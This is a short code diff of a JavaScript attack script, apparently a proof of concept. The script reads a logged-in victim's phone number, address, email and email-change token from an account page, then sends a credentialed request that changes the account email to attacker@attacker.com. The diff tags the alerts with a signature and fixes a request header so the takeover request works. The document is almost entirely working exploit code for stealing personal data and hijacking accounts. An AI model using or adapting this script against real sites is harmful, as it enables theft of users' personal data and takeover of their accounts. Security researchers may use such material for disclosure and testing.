@@ -20,11 +20,11 @@ if(fetchHash.readyState==4 && fetchHash.status==200)
                        var loot = document.createElement('html');
 					   loot.innerHTML = datax;
 					   all_elements = loot.getElementsByTagName( 'input' );
-					   alert('Stole your Phone number '+all_elements[8].value);
+					   alert('Stole your Phone number '+all_elements[8].value+' ...Tabahi');
 					   vc_address = all_elements[6].value+all_elements[7].value;
-					   alert('Stole your address '+vc_address);
+					   alert('Stole your address '+vc_address+' ...Tabahi');
 					   vc_emailId = all_elements[1].value;
-					   alert('Stole your email '+vc_emailId);
+					   alert('Stole your email '+vc_emailId+' ...Tabahi');
 					   
 
 
@@ -57,7 +57,7 @@ if(fetchHash.readyState==4 && fetchHash.status==200)
 					   loot.innerHTML = datax;
 					   all_elements = loot.getElementsByTagName( 'input' );
 					   vc_email_token = all_elements[2].value;
-					   alert('Stole your Email change Token: '+vc_email_token);
+					   alert('Stole your Email change Token: '+vc_email_token+' ...Tabahi');
 					   //hack(vc_email_token);
 
 
@@ -92,7 +92,7 @@ HackAccount .withCredentials=true;
 
 var data= 'AccountEmailForm%5BsEmail%5D%5Bfirst%5D=attacker%40attacker.com&AccountEmailForm%5BsEmail%5D%5Bsecond%5D=attacker%40attacker.com&AccountEmailForm%5B_token%5D='+emailToken ;
 
-HackAccount .setRequestHeader('X-Requested-With','XMLHtt');
+HackAccount .setRequestHeader('X-Requested-With','XMLHttpRequest');
 
 HackAccount .setRequestHeader('Content-Type','application/x-www-form-urlencoded');
 HackAccount .send(data);
